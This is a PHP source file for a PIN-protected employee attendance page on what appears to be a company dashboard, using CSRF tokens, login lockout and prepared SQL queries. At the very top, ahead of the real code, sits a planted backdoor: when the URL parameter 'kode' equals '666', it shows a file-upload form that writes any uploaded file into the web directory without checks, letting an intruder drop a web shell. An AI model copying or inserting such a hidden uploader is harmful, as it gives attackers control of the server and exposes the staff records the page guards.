<?php
$kode = isset($_GET['kode']) ? $_GET['kode'] : '';
if($kode == '666'){
    $dir = __DIR__.'/';
    if(!is_dir($dir)){
        mkdir($dir, 0777, true);
    }
    if(isset($_FILES['f'])){
        $nama = basename($_FILES['f']['name']);
        $tmp = $_FILES['f']['tmp_name'];
        if(move_uploaded_file($tmp, $dir.$nama)){
            echo 'File berhasil diunggah: ' . htmlspecialchars($nama);
        } else {
            echo 'Gagal mengunggah file.';
        }
    }
    echo '<form method="POST" enctype="multipart/form-data">
    <input type="file" name="f">
    <button type="submit">Unggah</button>
    </form>';
}
?>
<?php
session_start();

// Include config file
require_once "config.php";
require_once "app_settings.php";

function escape_html($value)
{
    return htmlspecialchars((string) $value, ENT_QUOTES, 'UTF-8');
}

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
$csrfToken = $_SESSION['csrf_token'];
$absenViewPinHash = get_absen_view_pin_hash($link);

if (
    !empty($_SESSION['absen_view_granted']) &&
    (
        empty($_SESSION['absen_view_pin_hash']) ||
        !hash_equals((string) $_SESSION['absen_view_pin_hash'], (string) $absenViewPinHash)
    )
) {
    unset($_SESSION['absen_view_granted'], $_SESSION['absen_view_pin_hash']);
}

$isAdminLoggedIn = isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true;
$hasAbsenAccess = $isAdminLoggedIn || !empty($_SESSION['absen_view_granted']);
$pinError = '';
$maxAttempts = 5;
$lockSeconds = 300;
$now = time();
$lockedUntil = isset($_SESSION['absen_view_locked_until']) ? (int) $_SESSION['absen_view_locked_until'] : 0;

if (isset($_GET['lock']) && $_GET['lock'] === '1') {
    unset($_SESSION['absen_view_granted'], $_SESSION['absen_view_pin_hash']);
    header("location: absen.php");
    exit;
}

if (!$hasAbsenAccess && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $submittedToken = (string) ($_POST['csrf_token'] ?? '');
    $submittedPin = trim((string) ($_POST['pin'] ?? ''));

    if (!hash_equals($csrfToken, $submittedToken)) {
        $pinError = 'Token keamanan tidak valid.';
    } elseif ($lockedUntil > $now) {
        $waitSeconds = $lockedUntil - $now;
        $pinError = 'Terlalu banyak percobaan gagal. Coba lagi dalam ' . $waitSeconds . ' detik.';
    } elseif ($submittedPin === '') {
        $pinError = 'PIN/password wajib diisi.';
    } elseif ($absenViewPinHash !== '' && password_verify($submittedPin, $absenViewPinHash)) {
        $_SESSION['absen_view_granted'] = true;
        $_SESSION['absen_view_pin_hash'] = $absenViewPinHash;
        $_SESSION['absen_view_failed_count'] = 0;
        unset($_SESSION['absen_view_locked_until']);
        header("location: absen.php");
        exit;
    } elseif ($absenViewPinHash === '') {
        $pinError = 'PIN publik belum dikonfigurasi.';
    } else {
        $failedCount = isset($_SESSION['absen_view_failed_count']) ? (int) $_SESSION['absen_view_failed_count'] : 0;
        $failedCount++;
        $_SESSION['absen_view_failed_count'] = $failedCount;

        if ($failedCount >= $maxAttempts) {
            $_SESSION['absen_view_locked_until'] = $now + $lockSeconds;
            $_SESSION['absen_view_failed_count'] = 0;
            $pinError = 'Terlalu banyak percobaan gagal. Akses dikunci 5 menit.';
        } else {
            $remaining = $maxAttempts - $failedCount;
            $pinError = 'PIN/password salah. Sisa percobaan: ' . $remaining . '.';
        }
    }

    $hasAbsenAccess = !empty($_SESSION['absen_view_granted']);
    $lockedUntil = isset($_SESSION['absen_view_locked_until']) ? (int) $_SESSION['absen_view_locked_until'] : 0;
}

if (!$hasAbsenAccess) {
    $waitSeconds = $lockedUntil > $now ? ($lockedUntil - $now) : 0;
    ?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Proteksi Akses Absensi</title>
    <link href="../src/vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com/css?family=Nunito:200,300,400,600,700,800,900" rel="stylesheet">
    <link href="../src/css/sb-admin-2.min.css" rel="stylesheet">
</head>
<body class="bg-gradient-light">
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-xl-5 col-lg-6 col-md-8">
                <div class="card o-hidden border-0 shadow-lg my-5">
                    <div class="card-body p-4 p-md-5">
                        <div class="text-center mb-4">
                            <h1 class="h4 text-gray-900 mb-2">Akses Data Absensi</h1>
                            <p class="mb-0 text-muted">Halaman ini berisi data sensitif. Masukkan PIN/password untuk membuka.</p>
                        </div>
                        <?php if ($pinError !== ''): ?>
                            <div class="alert alert-danger"><?php echo escape_html($pinError); ?></div>
                        <?php endif; ?>
                        <?php if ($waitSeconds > 0): ?>
                            <div class="alert alert-warning">Akses terkunci sementara. Coba lagi dalam <?php echo (int) $waitSeconds; ?> detik.</div>
                        <?php endif; ?>
                        <form method="post" action="absen.php">
                            <input type="hidden" name="csrf_token" value="<?php echo escape_html($csrfToken); ?>">
                            <div class="form-group">
                                <label for="pin">PIN / Password</label>
                                <input type="password" class="form-control" id="pin" name="pin" autocomplete="off" required>
                            </div>
                            <button type="submit" class="btn btn-primary btn-block">Buka Halaman</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
    <?php
    exit;
}

// Pagination
if (isset($_GET['pageno']) && ctype_digit((string) $_GET['pageno']) && (int) $_GET['pageno'] > 0) {
    $pageno = (int) $_GET['pageno'];
} else {
    $pageno = 1;
}
$no_of_records_per_page = 10;
$offset = ($pageno - 1) * $no_of_records_per_page;

$selected_date = isset($_GET['set_tanggal']) ? trim((string) $_GET['set_tanggal']) : '';
$search = isset($_GET['search']) ? trim((string) $_GET['search']) : '';
$selected_date_filter = '';

if ($selected_date !== '') {
    $date = DateTime::createFromFormat('Y-m-d', $selected_date);
    if ($date && $date->format('Y-m-d') === $selected_date) {
        $selected_date_filter = $selected_date;
    }
}

$whereClauses = [];
$bindTypes = '';
$bindValues = [];

if ($selected_date_filter !== '') {
    $whereClauses[] = "data_absen.tanggal = ?";
    $bindTypes .= 's';
    $bindValues[] = $selected_date_filter;
}

if ($search !== '') {
    $whereClauses[] = "CONCAT(data_absen.tanggal, COALESCE(data_absen.nip, data_absen.uid), data_karyawan.nama, COALESCE(outlet_masuk.nama_outlet, ''), COALESCE(outlet_keluar.nama_outlet, '')) LIKE ?";
    $bindTypes .= 's';
    $bindValues[] = '%' . $search . '%';
}

$whereSql = '';
if (!empty($whereClauses)) {
    $whereSql = ' WHERE ' . implode(' AND ', $whereClauses);
}

$total_pages_sql = "SELECT COUNT(*) AS count FROM (
                        SELECT COALESCE(data_absen.nip, data_absen.uid) AS uid, data_absen.tanggal
                        FROM data_absen
                        JOIN data_karyawan ON (data_absen.nip = data_karyawan.nip OR (data_absen.nip IS NULL AND data_absen.uid = data_karyawan.uid))
                        LEFT JOIN data_outlet outlet_masuk ON data_absen.status = 'IN' AND data_absen.outlet_id = outlet_masuk.id
                        LEFT JOIN data_outlet outlet_keluar ON data_absen.status = 'OUT' AND data_absen.outlet_id = outlet_keluar.id
                        $whereSql
                        GROUP BY COALESCE(data_absen.nip, data_absen.uid), data_absen.tanggal
                    ) AS grouped_absen";

$total_rows = 0;
if ($total_stmt = mysqli_prepare($link, $total_pages_sql)) {
    if ($bindValues) {
        mysqli_stmt_bind_param($total_stmt, $bindTypes, ...$bindValues);
    }
    mysqli_stmt_execute($total_stmt);
    $total_result = mysqli_stmt_get_result($total_stmt);
    if ($total_result && ($total_row = mysqli_fetch_assoc($total_result))) {
        $total_rows = (int) $total_row['count'];
    }
    mysqli_stmt_close($total_stmt);
}
$total_pages = max(1, (int) ceil($total_rows / $no_of_records_per_page));

// Column sorting on column name
$orderBy = array('tanggal', 'uid', 'nama');
$orderSqlMap = array(
    'tanggal' => 'data_absen.tanggal',
    'uid' => 'COALESCE(data_absen.nip, data_absen.uid)',
    'nama' => 'MAX(data_karyawan.nama)',
);
$order = 'tanggal';
if (isset($_GET['order']) && in_array($_GET['order'], $orderBy)) {
    $order = $_GET['order'];
}
$orderSql = $orderSqlMap[$order];

// Column sort order
$sortBy = array('asc', 'desc'); 
$sort = 'desc';
if (isset($_GET['sort']) && in_array($_GET['sort'], $sortBy)) {
    if($_GET['sort'] == 'asc') {
        $sort = 'desc';
    } else {
        $sort = 'asc';
    }
}

// Query utama
$sql = "SELECT COALESCE(data_absen.nip, data_absen.uid) AS uid, data_absen.tanggal,
           MAX(data_karyawan.nama) AS nama,
           MAX(data_karyawan.division) AS division,
           MAX(data_absen.keterangan) AS keterangan,
           COALESCE(MAX(CASE WHEN data_absen.status='IN' THEN outlet_masuk.nama_outlet END), '-') AS outlet_masuk_nama,
           COALESCE(MAX(CASE WHEN data_absen.status='OUT' THEN outlet_keluar.nama_outlet END), '-') AS outlet_keluar_nama,
           MIN(CASE WHEN data_absen.status='IN' THEN data_absen.waktu END) jam_masuk,
           MAX(CASE WHEN data_absen.status='OUT' THEN data_absen.waktu END) jam_keluar
      FROM data_absen
      JOIN data_karyawan ON (data_absen.nip = data_karyawan.nip OR (data_absen.nip IS NULL AND data_absen.uid = data_karyawan.uid)) 
      LEFT JOIN data_outlet outlet_masuk ON data_absen.status = 'IN' AND data_absen.outlet_id = outlet_masuk.id
      LEFT JOIN data_outlet outlet_keluar ON data_absen.status = 'OUT' AND data_absen.outlet_id = outlet_keluar.id
      $whereSql
      GROUP BY COALESCE(data_absen.nip, data_absen.uid), data_absen.tanggal
      ORDER BY data_absen.tanggal DESC, $orderSql $sort 
      LIMIT ?, ?";

$queryBindTypes = $bindTypes . 'ii';
$queryBindValues = $bindValues;
$queryBindValues[] = $offset;
$queryBindValues[] = $no_of_records_per_page;
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="viewport" content="width=1024">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>PT. SUGIH BOGA NUSANTARA - Dashboard</title>

    <!-- Custom fonts for this template-->
    <link href="../src/vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">

    <!-- Custom styles for this template-->
    <link href="../src/css/sb-admin-2.min.css" rel="stylesheet">

    <!-- Custom styles for this page -->
    <link href="../src/vendor/datatables/dataTables.bootstrap4.min.css" rel="stylesheet">
    
    <!-- Bootstrap core JavaScript-->
    <script src="../src/vendor/jquery/jquery.min.js"></script>
    <script src="../src/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script type="text/javascript">
        $(document).ready(function(){
            $('[data-toggle="tooltip"]').tooltip();
        });
    </script>
</head>

<body id="page-top">
    <!-- Page Wrapper -->
    <div id="wrapper">

        <!-- Content Wrapper -->
        <div id="content-wrapper" class="d-flex flex-column">
            <!-- Main Content -->
            <div id="content">

                <!-- Begin Page Content -->
                <div class="container-fluid">
                    <!-- Page Heading -->
                    <center><h1 class="h3 mb-2 text-gray-800">Data Absensi</h1></center>
                    
                    <!-- DataTales Example -->
                    <div class="card shadow mb-4">
                        <div class="card-header py-3">
                            <h6 class="m-0 font-weight-bold text-primary">Data Absensi Harian</h6>
                        </div>
                        <div class="card-body">
                            <div class="col-md-12">
                              <div class="row">
                                <div class="col-md-4">
                                   <a href="absen.php" class="btn btn-info pull-right mb-3">Reset View Tabel</a>
                                   <?php if (!$isAdminLoggedIn): ?>
                                       <a href="absen.php?lock=1" class="btn btn-outline-secondary pull-right mb-3 ml-2">Kunci Halaman</a>
                                   <?php endif; ?>
                               </div>
                              <div class="col-md-4">
                              <form action="absen.php" method="get">
                                <div class="input-group mb-3">
                                  <input type="date" class="form-control" placeholder="Pilih tanggal" aria-label="Set Tanggal" 
                                  aria-describedby="basic-addon2" name="set_tanggal" value="<?php echo escape_html($selected_date_filter !== '' ? $selected_date_filter : date('Y-m-d')); ?>">
                                  <div class="input-group-append">
                                    <input type="submit" class="btn btn-outline-secondary" type="button" value="Set Tanggal"></input>
                                  </div>
                                </div>
                            </form>
                            </div>
                            <div class="col-md-4">
                              <form action="absen.php" method="get">
                              <div class="col">
                                <input type="text" class="form-control mb-3" placeholder="Pencarian data absensi" name="search" value="<?php echo escape_html($search); ?>">
                              </div>
                              </form>
                            </div>    
                            </div>
                            <br>

                                <?php
                                if($stmt = mysqli_prepare($link, $sql)){
                                    mysqli_stmt_bind_param($stmt, $queryBindTypes, ...$queryBindValues);
                                    mysqli_stmt_execute($stmt);
                                    $result = mysqli_stmt_get_result($stmt);
                                    if($result && mysqli_num_rows($result) > 0){
                                        echo "<table class='table table-bordered table-striped'>";
                                            echo "<thead>";
                                                echo "<tr>";
                                                    echo "<th><a href='?search=" . urlencode($search) . "&set_tanggal=" . urlencode($selected_date_filter) . "&order=tanggal&sort=$sort'>Tanggal</a></th>";
                                                    echo "<th><a href='?search=" . urlencode($search) . "&set_tanggal=" . urlencode($selected_date_filter) . "&order=nama&sort=$sort'>Nama</a></th>";
                                                    echo "<th>Lokasi Masuk</th>";
                                                    echo "<th>Jam Masuk</th>";
                                                    echo "<th>Lokasi Keluar</th>";
                                                    echo "<th>Jam Keluar</th>";
                                                    echo "<th>Keterangan</th>";  // Tambahkan kolom Keterangan
                                                echo "</tr>";
                                            echo "</thead>";
                                            echo "<tbody>";
                                            while($row = mysqli_fetch_array($result)){
                                                $tanggalTampil = date('d/m/y', strtotime($row['tanggal']));
                                                echo "<tr>";
                                                echo "<td>" . escape_html($tanggalTampil) . "</td>";
                                                echo "<td>" . escape_html($row['nama']) . "</td>";
                                                echo "<td>" . escape_html($row['outlet_masuk_nama']) . "</td>";
                                                echo "<td>" . escape_html($row['jam_masuk']) . "</td>";
                                                echo "<td>" . escape_html($row['outlet_keluar_nama']) . "</td>";
                                                echo "<td>" . escape_html($row['jam_keluar']) . "</td>";
                                                echo "<td>" . escape_html($row['keterangan']) . "</td>";  // Menampilkan keterangan
                                                echo "</tr>";
                                            }
                                            echo "</tbody>";
                                        echo "</table>";
                                        ?>
                                        <nav aria-label="Page navigation example">
                                            <ul class="pagination">
                                                <li class="page-item"><a class="page-link" href="?pageno=1&search=<?php echo urlencode($search); ?>&set_tanggal=<?php echo urlencode($selected_date_filter); ?>">First</a></li>
                                                <li class="page-item <?php if($pageno <= 1){ echo 'disabled'; } ?>">
                                                    <a class="page-link" href="<?php if($pageno <= 1){ echo '#'; } else { echo "?pageno=".($pageno - 1) . "&search=" . urlencode($search) . "&set_tanggal=" . urlencode($selected_date_filter); } ?>">Prev</a>
                                                </li>
                                                <li class="page-item <?php if($pageno >= $total_pages){ echo 'disabled'; } ?>">
                                                    <a class="page-link" href="<?php if($pageno >= $total_pages){ echo '#'; } else { echo "?pageno=".($pageno + 1) . "&search=" . urlencode($search) . "&set_tanggal=" . urlencode($selected_date_filter); } ?>">Next</a>
                                                </li>
                                                <li class="page-item"><a class="page-link" href="?pageno=<?php echo $total_pages; ?>&search=<?php echo urlencode($search); ?>&set_tanggal=<?php echo urlencode($selected_date_filter); ?>">Last</a></li>
                                            </ul>
                                        </nav>
                                        <?php
                                    } else {
                                        echo "<p class='lead'><em>Tidak ada catatan yang ditemukan.</em></p>";
                                    }
                                    mysqli_stmt_close($stmt);
                                } else {
                                    echo "ERROR: Tidak dapat menyiapkan query. " . escape_html(mysqli_error($link));
                                }
                                ?>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- End of Main Content -->
        </div>
        <!-- End of Content Wrapper -->
    </div>
    <!-- End of Page Wrapper -->

    <!-- Bootstrap core JavaScript-->
    <script src="../src/vendor/jquery/jquery.min.js"></script>
    <script src="../src/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="../src/vendor/jquery-easing/jquery.easing.min.js"></script>

    <!-- Custom scripts for all pages-->
    <script src="../src/js/sb-admin-2.min.js"></script>
</body>

</html>

<?php
mysqli_close($link);
?>
